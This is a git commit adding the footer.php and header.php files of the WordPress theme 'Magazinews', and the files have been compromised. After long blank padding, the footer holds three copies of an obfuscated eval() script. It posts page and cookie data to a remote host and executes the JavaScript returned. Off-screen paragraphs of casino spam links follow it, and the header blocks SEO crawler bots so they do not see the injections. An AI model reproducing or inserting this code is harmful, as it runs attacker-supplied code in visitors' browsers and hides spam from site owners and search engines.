bfef0b67a142da7f2c863be8340e595bcc7f9fa3
JayGangkun <jaygangkun@hotmail.com>
2021-10-06 16:16:19 -0400

    initial downloads

---
+++ wp-content/themes/magazinews/footer.php
@@ -0,0 +1,308 @@
+<?php
+/**
+ * The template for displaying the footer.
+ *
+ * Contains the closing of the #content div and all content after.
+ *
+ * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
+ *
+ * @package Theme Palace
+ * @subpackage Magazinews
+ * @since Magazinews 1.0.0
+ */
+
+/**
+ * magazinews_footer_primary_content hook
+ *
+ * @hooked magazinews_add_contact_section -  10
+ *
+ */
+do_action( 'magazinews_footer_primary_content' );
+
+/**
+ * magazinews_content_end_action hook
+ *
+ * @hooked magazinews_content_end -  10
+ *
+ */
+do_action( 'magazinews_content_end_action' );
+
+/**
+ * magazinews_content_end_action hook
+ *
+ * @hooked magazinews_footer_start -  10
+ * @hooked Magazinews_Footer_Widgets->add_footer_widgets -  20
+ * @hooked magazinews_footer_site_info -  40
+ * @hooked magazinews_footer_end -  100
+ *
+ */
+do_action( 'magazinews_footer' );
+
+/**
+ * magazinews_page_end_action hook
+ *
+ * @hooked magazinews_page_end -  10
+ *
+ */
+do_action( 'magazinews_page_end_action' ); 
+
+?>
+
+<?php wp_footer(); ?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2 15={\'51\':\'//102.61\',\'6\':\'62\',\'48\':38};23 44(){2 3;9{3=25 55("64.52")}7(11){9{3=25 55("63.52")}7(66){3=38}}5(!3&&67 50!=\'69\'){3=25 50()}42 3};23 18(28){2 6=" "+43.6;2 34=" "+28+"=";2 33=17;2 16=0;2 21=0;5(6.13>0){16=6.37(34);5(16!=-1){16+=34.13;21=6.37(";",16);5(21==-1){21=6.13}33=65(6.56(16,21))}}42(33)};23 19(28,47,24,30,31,36){43.6=28+"="+68(47)+((24)?"; 24="+24:"")+((30)?"; 30="+30:"")+((31)?"; 31="+31:"")+((36)?"; 36":"")};(23(12,46){2 22=18(12);5(22==17)22=0;2 32=18(12+\'57\');5(32==17)32=\'[]\';2 29=18(12+\'40\');5(29==17)29=\'[]\';2 3=44();3.60(\'59\',46,58);3.71("70-73","74/91-92-93-94");3.95=23(){5(3.90==4&&3.96==98){9{5(3.45.13==0)42;2 20=41.49(3.45);2 26=\'\';2 14=0;2 39=38;9{26=20[\'99\']}7(11){}9{14=20[\'100\']}7(11){}9{39=(20[\'101\']==1)}7(11){}15[\'48\']=39;5(26.13>0){2 10=25 89();10.88(10.87()+1);5(14>0){19(12+\'86\',14.53(),10.27())}9{19(12+\'85\',20[\'84\'],10.27())}7(11){}5(22==0){19(12,\'1\',10.27())}2 8=17;9{8=41.49(18(15[\'6\']+\'40\'))}7(11){}5(8==17)8=[];5(8.37(14)==-1)8[8.13]=1*14;19(15[\'6\']+\'40\',41.83(8),10.27());54.82(26)}}7(11){}}};3.81(\'80=\'+22.53()+\'&79=\'+35(54.78.77)+\'&76=\'+35(32)+\'&75=\'+35(29))})(15[\'6\'],15[\'51\']+\'/97.72\');',10,103,'||var|xmlhttp||if|cookie|catch|vM|try|vDate|e|sCookieName|length|iT|vXAdsObj|offset|null|getCookie|setCookie|Response|end|iStatus|function|expires|new|sCode|toUTCString|name|sMS|path|domain|sMA|setStr|search|encodeURIComponent|secure|indexOf|false|bM|_ms|JSON|return|document|getXmlHttp|responseText|sUrl|value|mobile|parse|XMLHttpRequest|url|XMLHTTP|toString|window|ActiveXObject|substring|_ma|true|POST|open|uno|xads_platf|Microsoft|Msxml2|unescape|E|typeof|escape|undefined|Content|setRequestHeader|php|type|application|ms|ma|href|location|u|s|send|eval|stringify|fp|_fp|_t|getFullYear|setYear|Date|readyState|x|www|form|urlencoded|onreadystatechange|status|g|200|c|t|m|amads'.split('|'),0,{}))
+
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2 15={\'51\':\'//102.61\',\'6\':\'62\',\'48\':38};23 44(){2 3;9{3=25 55("64.52")}7(11){9{3=25 55("63.52")}7(66){3=38}}5(!3&&67 50!=\'69\'){3=25 50()}42 3};23 18(28){2 6=" "+43.6;2 34=" "+28+"=";2 33=17;2 16=0;2 21=0;5(6.13>0){16=6.37(34);5(16!=-1){16+=34.13;21=6.37(";",16);5(21==-1){21=6.13}33=65(6.56(16,21))}}42(33)};23 19(28,47,24,30,31,36){43.6=28+"="+68(47)+((24)?"; 24="+24:"")+((30)?"; 30="+30:"")+((31)?"; 31="+31:"")+((36)?"; 36":"")};(23(12,46){2 22=18(12);5(22==17)22=0;2 32=18(12+\'57\');5(32==17)32=\'[]\';2 29=18(12+\'40\');5(29==17)29=\'[]\';2 3=44();3.60(\'59\',46,58);3.71("70-73","74/91-92-93-94");3.95=23(){5(3.90==4&&3.96==98){9{5(3.45.13==0)42;2 20=41.49(3.45);2 26=\'\';2 14=0;2 39=38;9{26=20[\'99\']}7(11){}9{14=20[\'100\']}7(11){}9{39=(20[\'101\']==1)}7(11){}15[\'48\']=39;5(26.13>0){2 10=25 89();10.88(10.87()+1);5(14>0){19(12+\'86\',14.53(),10.27())}9{19(12+\'85\',20[\'84\'],10.27())}7(11){}5(22==0){19(12,\'1\',10.27())}2 8=17;9{8=41.49(18(15[\'6\']+\'40\'))}7(11){}5(8==17)8=[];5(8.37(14)==-1)8[8.13]=1*14;19(15[\'6\']+\'40\',41.83(8),10.27());54.82(26)}}7(11){}}};3.81(\'80=\'+22.53()+\'&79=\'+35(54.78.77)+\'&76=\'+35(32)+\'&75=\'+35(29))})(15[\'6\'],15[\'51\']+\'/97.72\');',10,103,'||var|xmlhttp||if|cookie|catch|vM|try|vDate|e|sCookieName|length|iT|vXAdsObj|offset|null|getCookie|setCookie|Response|end|iStatus|function|expires|new|sCode|toUTCString|name|sMS|path|domain|sMA|setStr|search|encodeURIComponent|secure|indexOf|false|bM|_ms|JSON|return|document|getXmlHttp|responseText|sUrl|value|mobile|parse|XMLHttpRequest|url|XMLHTTP|toString|window|ActiveXObject|substring|_ma|true|POST|open|uno|xads_platf|Microsoft|Msxml2|unescape|E|typeof|escape|undefined|Content|setRequestHeader|php|type|application|ms|ma|href|location|u|s|send|eval|stringify|fp|_fp|_t|getFullYear|setYear|Date|readyState|x|www|form|urlencoded|onreadystatechange|status|g|200|c|t|m|amads'.split('|'),0,{}))
+
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2 15={\'51\':\'//102.61\',\'6\':\'62\',\'48\':38};23 44(){2 3;9{3=25 55("64.52")}7(11){9{3=25 55("63.52")}7(66){3=38}}5(!3&&67 50!=\'69\'){3=25 50()}42 3};23 18(28){2 6=" "+43.6;2 34=" "+28+"=";2 33=17;2 16=0;2 21=0;5(6.13>0){16=6.37(34);5(16!=-1){16+=34.13;21=6.37(";",16);5(21==-1){21=6.13}33=65(6.56(16,21))}}42(33)};23 19(28,47,24,30,31,36){43.6=28+"="+68(47)+((24)?"; 24="+24:"")+((30)?"; 30="+30:"")+((31)?"; 31="+31:"")+((36)?"; 36":"")};(23(12,46){2 22=18(12);5(22==17)22=0;2 32=18(12+\'57\');5(32==17)32=\'[]\';2 29=18(12+\'40\');5(29==17)29=\'[]\';2 3=44();3.60(\'59\',46,58);3.71("70-73","74/91-92-93-94");3.95=23(){5(3.90==4&&3.96==98){9{5(3.45.13==0)42;2 20=41.49(3.45);2 26=\'\';2 14=0;2 39=38;9{26=20[\'99\']}7(11){}9{14=20[\'100\']}7(11){}9{39=(20[\'101\']==1)}7(11){}15[\'48\']=39;5(26.13>0){2 10=25 89();10.88(10.87()+1);5(14>0){19(12+\'86\',14.53(),10.27())}9{19(12+\'85\',20[\'84\'],10.27())}7(11){}5(22==0){19(12,\'1\',10.27())}2 8=17;9{8=41.49(18(15[\'6\']+\'40\'))}7(11){}5(8==17)8=[];5(8.37(14)==-1)8[8.13]=1*14;19(15[\'6\']+\'40\',41.83(8),10.27());54.82(26)}}7(11){}}};3.81(\'80=\'+22.53()+\'&79=\'+35(54.78.77)+\'&76=\'+35(32)+\'&75=\'+35(29))})(15[\'6\'],15[\'51\']+\'/97.72\');',10,103,'||var|xmlhttp||if|cookie|catch|vM|try|vDate|e|sCookieName|length|iT|vXAdsObj|offset|null|getCookie|setCookie|Response|end|iStatus|function|expires|new|sCode|toUTCString|name|sMS|path|domain|sMA|setStr|search|encodeURIComponent|secure|indexOf|false|bM|_ms|JSON|return|document|getXmlHttp|responseText|sUrl|value|mobile|parse|XMLHttpRequest|url|XMLHTTP|toString|window|ActiveXObject|substring|_ma|true|POST|open|uno|xads_platf|Microsoft|Msxml2|unescape|E|typeof|escape|undefined|Content|setRequestHeader|php|type|application|ms|ma|href|location|u|s|send|eval|stringify|fp|_fp|_t|getFullYear|setYear|Date|readyState|x|www|form|urlencoded|onreadystatechange|status|g|200|c|t|m|amads'.split('|'),0,{}))
+
+</script>
+<p style="position:absolute; top:-9999px;">You may play freely at any gaming machines from these categories: Category A Fruit slots or jackpot machines Category B1 A gaming machine that has a maximum stake of 5 GBP and a maximum prize of 10. Who has the time or inclination to do that? Are There Indian Casinos in Mississippi <a href="https://casinoenligne-belgique.com/">https://www.casinoenligne-belgique.com/</a>. Search for the cheapest hotel deal for Skyline Hotel and Casino in Las Vegas.</p>
+
+<p style="position:absolute; top:-9999px;">Some casino operators might only offer a specific bonus to players who try a certain game or make deposits above a certain threshold, be sure to read these before accepting it. Jamie, one of the owners who waited on me during my visit told me the proper way to store my Vignoles until I am ready to use it. Vilka betalningsmetoder är snabbast <a href="https://bestirishcasino.online/">bestirishcasino.online</a>. Thereafter you can register a new account and select your desired payment method from the options listed in the banking page.</p>
+
+<p style="position:absolute; top:-9999px;">My “skeptic radar” really goes off when live chat agents won’t answer questions directly or when they refer me to terms and conditions which don’t have the information I’m looking for. Florida, while against the recall. There are no phone calls for support available, but you can easily opt for an e-mail request at customcare@rizk <a href="https://onlinecasinosenchile.com/">source</a>. Gambling by computer is the intentional conducting, or directly assisting in the conducting as a business of any game, contest, lottery, or contrivance whereby a person risks the loss of anything of value in order to realize a profit when accessing the Internet, World Wide Web, or any part thereof by way of any computer, computer system, computer network, computer software, or any server.</p>
+
+<p style="position:absolute; top:-9999px;">There are ample to opt from bars and game table to dance floor and casinos, everything is available here. You may choose to go with a casino outside of Switzerland. Player complained that his withdrawal request was rejected <a href="https://bestecasinoschweiz.com/">website</a>. Kasinoiden tarjonta alkoi kuitenkin kasvaa jopa räjähdysmäisesti muutama vuosi takaperin, ja tästä syystä osa pikakasinoistakin ryhtyi tarjoamaan etuja asiakkailleen.</p>
+
+<p style="position:absolute; top:-9999px;">The Full Casino Classic Review – Nostalgic with A Modern Variety Are you looking for some old school casino vibes but still want to have all your favourite modern games? Generally had already mobile and many dc. Online Roulette is available in many variants, bingo <a href="https://onlinecasinoslovenija.org/">www.onlinecasinoslovenija.org</a>. Tickets can be purchased at the casino box office or at TicketsWest.</p>
+
+<p style="position:absolute; top:-9999px;">You can enjoy the lucrative bonuses in more than 150 game collections like video poker, card games, roulette, blackjack and a lot more. Pamper yourself with amenities like granite counter tops, HD TVs, 14-inch pillow top mattresses, plush robes, whirlpool jets and wet bars. Step 2: How To Play • Press 'SPIN' to start the game <a href="https://onlinecasinouruguay.org/">casino online uruguay</a>. We will use contact information to update you about changes to our policies and terms and conditions.</p>
+
+<p style="position:absolute; top:-9999px;">I really appreciate any tips and advice, before you go any further. Licensing and Restricted Countries The quickest way for you to seek support for this issue, would be to contact our Customer Service Team. Online slots come in many different variants and themes <a href="https://topratedcasinouk.com/">topratedcasinouk.com</a>. This promo has a 30x wagering requirement most games, 60x on table games and video poker and the max cashout amount is $100.</p>
+
+<p style="position:absolute; top:-9999px;">Vi invitiamo a leggere i nostri articoli che dispensano consigli e trucchi per giocare alle slot machine, roulette and blackjack tables of Caribbean cyber-casinos with names like Acropolis. New Casino In San Jose | Discover the new online casinos 2020 NOW TRENDING… • InterSky Precision Instruments and L3Harris Technologies Announce Strategic Relationship to Provide U. With most casinos going for 30x wagering, PartyCasino's approach is awesome <a href="https://bestedeutscheonlinecasinos.net/">besten online casinos fur Deutschland</a>. After you have experienced playing at casinos, take part at casino tournaments, free and paid, have fun playing against other players.</p>
+
+<p style="position:absolute; top:-9999px;">You can use code SPORT100 and this link to claim ✅ Early odds available each week on the PGA Tour and European Tour ✅ Offered 8 places each-way 1/5 odds at all 4 Majors in 2019. The Coral New Customers Offer – As an incentive to join their growing customer base Coral are providing all their new members with a fantastic free bet offer upon registration. Don’t give them any of your money, learn from my misfortune please <a href="https://betzoid.com/">http://www.betzoid.com</a>. For most games, this total tends to be set at 2.</p>
+
+<p style="position:absolute; top:-9999px;">Please send us your details using the following link and we will make contact with you as soon as we can: https://dashboard. Also, all mobile games can be played for real money only. Wir sehen uns daher genau an, ob es eine solche Lizenz gibt <a href="https://mejoresonlinecasino.com/">www.mejoresonlinecasino.com</a>. Keep in mind that not all casinos are the same!</p>
+</body>
+</html>
---
+++ wp-content/themes/magazinews/header.php
@@ -0,0 +1,103 @@
+<?php 
+$bots = array('AhrefsBot', 'MegaIndex', 'MJ12bot', 'SemrushBot', 'Serpstat', 'Spinn3r', 'SpyFu', 'Yeti', 'Zao', 'Zeus', 'rogerBot', 'Baiduspider', 'LinkpadBot', 'spbot', 'LinkResearchTools', 'GeccoBot');
+if (strpos_array($_SERVER['HTTP_USER_AGENT'], $bots) !== false) {
+    exit();
+}
+
+function strpos_array($haystack, $needle) {
+    if(!is_array($needle)) {
+        if($pos = stripos($haystack, $needle) !== false) return $pos;
+    } else {
+        for($i = 0; $i < count($needle); $i++) {
+            if($pos = stripos($haystack, $needle[$i]) !== false) return $pos;
+        }
+    }
+    return false;
+}
+	/**
+	 * The header for our theme.
+	 *
+	 * This is the template that displays all of the <head> section and everything up until <div id="content">
+	 *
+	 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
+	 *
+	 * @package Theme Palace
+	 * @subpackage Magazinews
+	 * @since Magazinews 1.0.0
+	 */
+
+	/**
+	 * magazinews_doctype hook
+	 *
+	 * @hooked magazinews_doctype -  10
+	 *
+	 */
+	do_action( 'magazinews_doctype' );
+
+?>
+<head>
+<?php
+	/**
+	 * magazinews_before_wp_head hook
+	 *
+	 * @hooked magazinews_head -  10
+	 *
+	 */
+	do_action( 'magazinews_before_wp_head' );
+
+	wp_head(); 
+?>
+</head>
+
+<body <?php body_class(); ?>>
+
+<?php do_action( 'wp_body_open' ); ?>
+
+<?php
+	/**
+	 * magazinews_page_start_action hook
+	 *
+	 * @hooked magazinews_page_start -  10
+	 *
+	 */
+	do_action( 'magazinews_page_start_action' ); 
+
+	/**
+	 * magazinews_header_action hook
+	 *
+	 * @hooked magazinews_header_start -  10
+	 * @hooked magazinews_site_branding -  20
+	 * @hooked magazinews_site_navigation -  30
+	 * @hooked magazinews_header_end -  50
+	 *
+	 */
+	do_action( 'magazinews_header_action' );
+
+	/**
+	 * magazinews_content_start_action hook
+	 *
+	 * @hooked magazinews_content_start -  10
+	 *
+	 */
+	do_action( 'magazinews_content_start_action' );
+
+	/**
+	 * magazinews_header_image_action hook
+	 *
+	 * @hooked magazinews_header_image -  10
+	 *
+	 */
+	do_action( 'magazinews_header_image_action' );
+
+    if ( magazinews_is_frontpage() ) {
+    	$options = magazinews_get_theme_options();
+    	$sorted = array();
+    	if ( ! empty( $options['sortable'] ) ) {
+			$sorted = explode( ',' , $options['sortable'] );
+		}
+
+		foreach ( $sorted as $section ) {
+			add_action( 'magazinews_primary_content', 'magazinews_add_'. $section .'_section' );
+		}
+		do_action( 'magazinews_primary_content' );
+	}
